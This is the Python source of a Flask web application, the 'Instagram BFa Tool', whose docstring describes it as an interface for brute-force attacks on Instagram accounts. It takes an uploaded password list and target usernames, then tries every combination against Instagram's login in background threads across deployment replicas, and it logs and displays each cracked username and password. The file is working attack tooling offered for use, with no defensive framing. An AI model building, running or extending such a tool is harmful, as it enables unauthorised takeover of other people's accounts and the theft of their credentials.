"""
Instagram BFa Web Application
Main Flask application with web interface for Instagram brute force attacks
"""

import os
import threading
import time
from datetime import datetime
from typing import List, Dict, Any, Optional
from flask import Flask, request, jsonify, render_template_string, send_from_directory, redirect, url_for
import logging
from werkzeug.utils import secure_filename
from config import config
from instagram_api import instagram_handler, LoginResult
from file_processor import password_processor
from models import BFaTask, BFaResult, task_manager
import uuid

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.config.from_object(config)
app.secret_key = config.SECRET_KEY

# HTML Templates
MAIN_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram BFa Tool</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        
        .header {
            text-align: center;
            color: white;
            margin-bottom: 30px;
        }
        
        .header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        }
        
        .header p {
            font-size: 1.1em;
            opacity: 0.9;
        }
        
        .card {
            background: white;
            border-radius: 10px;
            padding: 25px;
            margin-bottom: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #333;
        }
        
        .form-group input[type="text"],
        .form-group input[type="file"],
        .form-group textarea {
            width: 100%;
            padding: 12px;
            border: 2px solid #e1e1e1;
            border-radius: 5px;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        
        .form-group input[type="text"]:focus,
        .form-group input[type="file"]:focus,
        .form-group textarea:focus {
            outline: none;
            border-color: #667eea;
        }
        
        .form-group textarea {
            min-height: 100px;
            resize: vertical;
        }
        
        .btn {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            font-weight: 600;
            transition: transform 0.2s, box-shadow 0.2s;
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
        }
        
        .btn:active {
            transform: translateY(0);
        }
        
        .btn-secondary {
            background: #6c757d;
        }
        
        .btn-danger {
            background: #dc3545;
        }
        
        .btn-success {
            background: #28a745;
        }
        
        .file-info {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 5px;
            margin-top: 10px;
            display: none;
        }
        
        .file-info.show {
            display: block;
        }
        
        .task-list {
            margin-top: 20px;
        }
        
        .task-card {
            background: #f8f9fa;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 15px;
            border-left: 4px solid #667eea;
        }
        
        .task-card.pending {
            border-left-color: #ffc107;
        }
        
        .task-card.processing {
            border-left-color: #007bff;
        }
        
        .task-card.completed {
            border-left-color: #28a745;
        }
        
        .task-card.failed {
            border-left-color: #dc3545;
        }
        
        .task-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
        }
        
        .task-id {
            font-size: 0.9em;
            color: #666;
        }
        
        .status-badge {
            padding: 4px 12px;
            border-radius: 12px;
            font-size: 0.85em;
            font-weight: 600;
            text-transform: uppercase;
        }
        
        .status-pending { background: #fff3cd; color: #856404; }
        .status-processing { background: #d1ecf1; color: #0c5460; }
        .status-completed { background: #d4edda; color: #155724; }
        .status-failed { background: #f8d7da; color: #721c24; }
        
        .progress-bar {
            height: 20px;
            background: #e9ecef;
            border-radius: 10px;
            overflow: hidden;
            margin: 10px 0;
        }
        
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #667eea 0%, #764ba2 100%);
            transition: width 0.3s;
        }
        
        .results {
            margin-top: 15px;
            padding-top: 15px;
            border-top: 1px solid #e9ecef;
        }
        
        .result-item {
            padding: 8px;
            margin-bottom: 5px;
            border-radius: 4px;
            font-size: 0.9em;
        }
        
        .result-success {
            background: #d4edda;
            color: #155724;
        }
        
        .result-failure {
            background: #f8d7da;
            color: #721c24;
        }
        
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-top: 15px;
        }
        
        .stat-card {
            background: white;
            padding: 15px;
            border-radius: 8px;
            text-align: center;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }
        
        .stat-value {
            font-size: 2em;
            font-weight: bold;
            color: #667eea;
        }
        
        .stat-label {
            color: #666;
            font-size: 0.9em;
            margin-top: 5px;
        }
        
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s ease-in-out infinite;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 15px 25px;
            background: white;
            border-radius: 8px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
            display: none;
            z-index: 1000;
            animation: slideIn 0.3s ease-out;
        }
        
        @keyframes slideIn {
            from {
                transform: translateX(100%);
                opacity: 0;
            }
            to {
                transform: translateX(0);
                opacity: 1;
            }
        }
        
        .notification.show {
            display: block;
        }
        
        .notification.success {
            border-left: 4px solid #28a745;
        }
        
        .notification.error {
            border-left: 4px solid #dc3545;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔍 Instagram BFa Tool</h1>
            <p>Brute Force Attack with Railway Replicas Support</p>
        </div>
        
        <div class="card">
            <h2>📁 Upload Password File</h2>
            <form id="uploadForm" enctype="multipart/form-data">
                <div class="form-group">
                    <label for="passwordFile">Password File (txt, csv, json)</label>
                    <input type="file" id="passwordFile" name="passwordFile" accept=".txt,.csv,.json" required>
                </div>
                <div class="form-group">
                    <label for="usernames">Usernames (comma separated)</label>
                    <textarea id="usernames" name="usernames" placeholder="username1, username2, username3" required></textarea>
                </div>
                <button type="submit" class="btn">
                    <span id="submitText">Start BFa Attack</span>
                    <span id="submitLoading" class="loading" style="display: none;"></span>
                </button>
            </form>
            
            <div id="fileInfo" class="file-info">
                <strong>File:</strong> <span id="fileName"></span><br>
                <strong>Passwords:</strong> <span id="passwordCount"></span>
            </div>
        </div>
        
        <div class="card">
            <h2>📊 Active Tasks</h2>
            <div id="taskList" class="task-list"></div>
        </div>
        
        <div class="card">
            <h2>📈 Statistics</h2>
            <div class="stats">
                <div class="stat-card">
                    <div class="stat-value" id="totalTasks">0</div>
                    <div class="stat-label">Total Tasks</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value" id="successfulLogins">0</div>
                    <div class="stat-label">Successful Logins</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value" id="totalAttempts">0</div>
                    <div class="stat-label">Total Attempts</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value" id="replicaId">Replica {{ replica_id }}</div>
                    <div class="stat-label">Current Replica</div>
                </div>
            </div>
        </div>
    </div>
    
    <div id="notification" class="notification"></div>
    
    <script>
        const replicaId = '{{ replica_id }}';
        let tasks = [];
        
        // Show notification
        function showNotification(message, type = 'success') {
            const notification = document.getElementById('notification');
            notification.textContent = message;
            notification.className = 'notification ' + type;
            notification.classList.add('show');
            
            setTimeout(() => {
                notification.classList.remove('show');
            }, 5000);
        }
        
        // Update task list
        function updateTaskList() {
            fetch('/api/tasks')
                .then(response => response.json())
                .then(data => {
                    tasks = data.tasks;
                    const taskList = document.getElementById('taskList');
                    
                    if (tasks.length === 0) {
                        taskList.innerHTML = '<p>No active tasks</p>';
                        return;
                    }
                    
                    taskList.innerHTML = tasks.map(task => `
                        <div class="task-card ${task.status}">
                            <div class="task-header">
                                <div>
                                    <strong>${task.username || task.usernames.join(', ')}</strong>
                                    <span class="task-id">Task: ${task.task_id.substring(0, 8)}...</span>
                                </div>
                                <span class="status-badge status-${task.status}">${task.status}</span>
                            </div>
                            <div class="progress-bar">
                                <div class="progress-fill" style="width: ${task.progress}/${task.total} * 100%">
                                </div>
                            </div>
                            <div style="font-size: 0.9em; color: #666; margin-top: 5px;">
                                Progress: ${task.progress}/${task.total} (${Math.round((task.progress/task.total)*100)}%)
                            </div>
                            ${task.successful_logins.length > 0 ? `
                                <div class="results">
                                    <strong>Successful Logins:</strong>
                                    ${task.successful_logins.map(login => `
                                        <div class="result-item result-success">
                                            ${login.username}: ${login.password}
                                        </div>
                                    `).join('')}
                                </div>
                            ` : ''}
                            ${task.error ? `
                                <div class="result-item result-failure">
                                    Error: ${task.error}
                                </div>
                            ` : ''}
                        </div>
                    `).join('');
                    
                    // Update stats
                    document.getElementById('totalTasks').textContent = tasks.length;
                    document.getElementById('successfulLogins').textContent = 
                        tasks.reduce((sum, task) => sum + task.successful_logins.length, 0);
                    document.getElementById('totalAttempts').textContent = 
                        tasks.reduce((sum, task) => sum + task.progress, 0);
                });
        }
        
        // Upload form submission
        document.getElementById('uploadForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const fileInput = document.getElementById('passwordFile');
            const usernamesInput = document.getElementById('usernames');
            const submitText = document.getElementById('submitText');
            const submitLoading = document.getElementById('submitLoading');
            
            if (!fileInput.files.length) {
                showNotification('Please select a password file', 'error');
                return;
            }
            
            if (!usernamesInput.value.trim()) {
                showNotification('Please enter at least one username', 'error');
                return;
            }
            
            submitText.style.display = 'none';
            submitLoading.style.display = 'inline-block';
            
            const formData = new FormData();
            formData.append('passwordFile', fileInput.files[0]);
            formData.append('usernames', usernamesInput.value);
            
            fetch('/api/tasks', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                submitText.style.display = 'inline';
                submitLoading.style.display = 'none';
                
                if (data.success) {
                    showNotification(`Task started: ${data.task_id.substring(0, 8)}...`);
                    usernamesInput.value = '';
                    fileInput.value = '';
                    document.getElementById('fileInfo').classList.remove('show');
                    updateTaskList();
                } else {
                    showNotification(data.error || 'Failed to start task', 'error');
                }
            })
            .catch(error => {
                submitText.style.display = 'inline';
                submitLoading.style.display = 'none';
                showNotification('Error: ' + error.message, 'error');
            });
        });
        
        // File input change handler
        document.getElementById('passwordFile').addEventListener('change', function(e) {
            if (e.target.files.length) {
                const file = e.target.files[0];
                document.getElementById('fileName').textContent = file.name;
                
                // Preview password count
                const formData = new FormData();
                formData.append('passwordFile', file);
                
                fetch('/api/preview', {
                    method: 'POST',
                    body: formData
                })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        document.getElementById('passwordCount').textContent = data.password_count;
                        document.getElementById('fileInfo').classList.add('show');
                    }
                });
            }
        });
        
        // Poll for task updates
        function pollTasks() {
            updateTaskList();
            setTimeout(pollTasks, 2000);
        }
        
        // Start polling
        pollTasks();
        
        // Initial load
        updateTaskList();
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    """Main page"""
    return render_template_string(MAIN_TEMPLATE, replica_id=config.REPLICA_ID)

@app.route('/health')
def health():
    """Health check endpoint for Railway"""
    return jsonify({
        'status': 'healthy',
        'replica_id': config.REPLICA_ID,
        'timestamp': datetime.now().isoformat()
    })

@app.route('/api/preview', methods=['POST'])
def preview_file():
    """Preview password file to get password count"""
    try:
        if 'passwordFile' not in request.files:
            return jsonify({'success': False, 'error': 'No file uploaded'}), 400
        
        file_storage = request.files['passwordFile']
        if file_storage.filename == '':
            return jsonify({'success': False, 'error': 'No file selected'}), 400
        
        # Save temporarily to process with original extension
        filename = file_storage.filename or "temp"
        temp_path = os.path.join(config.UPLOAD_FOLDER, f"temp_{uuid.uuid4()}_{filename}")
        file_storage.save(temp_path)
        
        try:
            result = password_processor.process_password_file(temp_path)
            return jsonify({
                'success': result['success'],
                'password_count': result['password_count'],
                'filename': result['filename']
            })
        finally:
            # Clean up temp file
            if os.path.exists(temp_path):
                os.remove(temp_path)
                
    except Exception as e:
        logger.error(f"Preview error: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/tasks', methods=['GET'])
def get_tasks():
    """Get all tasks"""
    try:
        all_tasks = task_manager.get_all_tasks()
        tasks_data = [task.to_dict() for task in all_tasks]
        
        return jsonify({
            'success': True,
            'tasks': tasks_data,
            'count': len(tasks_data)
        })
    except Exception as e:
        logger.error(f"Error getting tasks: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/tasks', methods=['POST'])
def create_task():
    """Create a new BFa task"""
    try:
        if 'passwordFile' not in request.files:
            return jsonify({'success': False, 'error': 'No password file uploaded'}), 400
        
        if 'usernames' not in request.form or not request.form['usernames'].strip():
            return jsonify({'success': False, 'error': 'No usernames provided'}), 400
        
        file_storage = request.files['passwordFile']
        usernames_input = request.form['usernames'].strip()
        
        # Process usernames
        usernames = [u.strip() for u in usernames_input.split(',') if u.strip()]
        if not usernames:
            return jsonify({'success': False, 'error': 'No valid usernames provided'}), 400
        
        # Save the file
        filepath = password_processor.save_uploaded_file(file_storage)
        if not filepath:
            return jsonify({'success': False, 'error': 'Failed to save file'}), 500
        
        # Process the password file
        result = password_processor.process_password_file(filepath)
        if not result['success']:
            password_processor.cleanup_file(filepath)
            return jsonify({'success': False, 'error': result['error']}), 500
        
        passwords = result['passwords']
        if not passwords:
            password_processor.cleanup_file(filepath)
            return jsonify({'success': False, 'error': 'No passwords found in file'}), 400
        
        # Create task
        # Create the task directly with all properties
        task = BFaTask(
            username=usernames[0] if len(usernames) == 1 else "",
            usernames=usernames,
            password_file=result['filename'],
            passwords=passwords,
            total=len(passwords) * len(usernames),
            replica_id=config.REPLICA_ID
        )
        
        # Store the task in the manager
        task_manager.tasks[task.task_id] = task
        
        # Start processing in background
        threading.Thread(
            target=process_task_background,
            args=(task.task_id, filepath),
            daemon=True
        ).start()
        
        return jsonify({
            'success': True,
            'task_id': task.task_id,
            'message': f'Task created with {len(passwords)} passwords for {len(usernames)} usernames'
        })
        
    except Exception as e:
        logger.error(f"Error creating task: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/tasks/<task_id>', methods=['GET'])
def get_task(task_id: str):
    """Get a specific task"""
    try:
        task = task_manager.get_task(task_id)
        if not task:
            return jsonify({'success': False, 'error': 'Task not found'}), 404
        
        return jsonify({'success': True, 'task': task.to_dict()})
    except Exception as e:
        logger.error(f"Error getting task {task_id}: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/tasks/<task_id>', methods=['DELETE'])
def delete_task(task_id: str):
    """Delete a task"""
    try:
        task = task_manager.get_task(task_id)
        if not task:
            return jsonify({'success': False, 'error': 'Task not found'}), 404
        
        # Clean up the password file if it exists
        if task.password_file:
            file_path = os.path.join(config.UPLOAD_FOLDER, task.password_file)
            password_processor.cleanup_file(file_path)
        
        task_manager.delete_task(task_id)
        return jsonify({'success': True, 'message': 'Task deleted'})
    except Exception as e:
        logger.error(f"Error deleting task {task_id}: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

def process_task_background(task_id: str, filepath: str):
    """Process a task in the background"""
    try:
        # Small delay to ensure task is fully stored
        time.sleep(0.1)
        
        task = task_manager.get_task(task_id)
        if not task:
            logger.error(f"Task {task_id} not found in task manager")
            # Try to recover by checking all tasks
            all_tasks = task_manager.get_all_tasks()
            logger.error(f"Available tasks: {[t.task_id for t in all_tasks]}")
            return
        
        # Update task status
        task.status = "processing"
        task.start_time = datetime.now()
        task_manager.update_task(task)
        
        logger.info(f"Starting task {task_id} for {len(task.usernames)} usernames with {len(task.passwords)} passwords")
        
        # Process each username
        for username in task.usernames:
            if task.status == "failed":
                break
                
            logger.info(f"Processing username: {username}")
            
            # Process passwords in batches for better performance
            for password_batch in password_processor.get_password_generator(
                task.passwords, config.BATCH_SIZE
            ):
                if task.status == "failed":
                    break
                    
                # Check each password in the batch
                for password in password_batch:
                    if task.status == "failed":
                        break
                        
                    try:
                        result = instagram_handler.check_credentials(username, password)
                        
                        # Update progress
                        task.progress += 1
                        
                        if result.success:
                            task.successful_logins.append({
                                'username': username,
                                'password': password,
                                'profile': result.profile,
                                'timestamp': datetime.now().isoformat()
                            })
                            
                            logger.info(f"SUCCESS: {username}:{password}")
                            
                            # We can stop here if we want to find just one valid password
                            # But continue to find all valid passwords
                            
                        task.results.append({
                            'username': username,
                            'password': password if result.success else "***",
                            'success': result.success,
                            'message': result.message,
                            'error_type': result.error_type,
                            'timestamp': datetime.now().isoformat()
                        })
                        
                        task_manager.update_task(task)
                        
                    except Exception as e:
                        logger.error(f"Error checking {username}:{password}: {e}")
                        task.failed_attempts += 1
                        task.progress += 1
                        task_manager.update_task(task)
                        
                        # Add a small delay to avoid overwhelming the system
                        time.sleep(0.1)
                
                # Small delay between batches to respect rate limits
                time.sleep(1)
        
        # Mark task as completed
        task.status = "completed"
        task.end_time = datetime.now()
        task_manager.update_task(task)
        
        logger.info(f"Task {task_id} completed. Found {len(task.successful_logins)} valid logins.")
        
        # Clean up the file
        password_processor.cleanup_file(filepath)
        
    except Exception as e:
        logger.error(f"Error processing task {task_id}: {e}")
        
        task = task_manager.get_task(task_id)
        if task:
            task.status = "failed"
            task.error = str(e)
            task.end_time = datetime.now()
            task_manager.update_task(task)

@app.route('/uploads/<filename>')
def uploaded_file(filename):
    """Serve uploaded files"""
    return send_from_directory(config.UPLOAD_FOLDER, filename)

if __name__ == '__main__':
    # Create upload folder
    os.makedirs(config.UPLOAD_FOLDER, exist_ok=True)
    
    logger.info(f"Starting Instagram BFa on {config.HOST}:{config.PORT}")
    logger.info(f"Replica ID: {config.REPLICA_ID}")
    logger.info(f"Max concurrent checks: {config.MAX_CONCURRENT_CHECKS}")
    logger.info(f"Instagram rate limit: {config.INSTAGRAM_RATE_LIMIT}/min")
    
    app.run(host=config.HOST, port=config.PORT, debug=config.DEBUG, threaded=True)
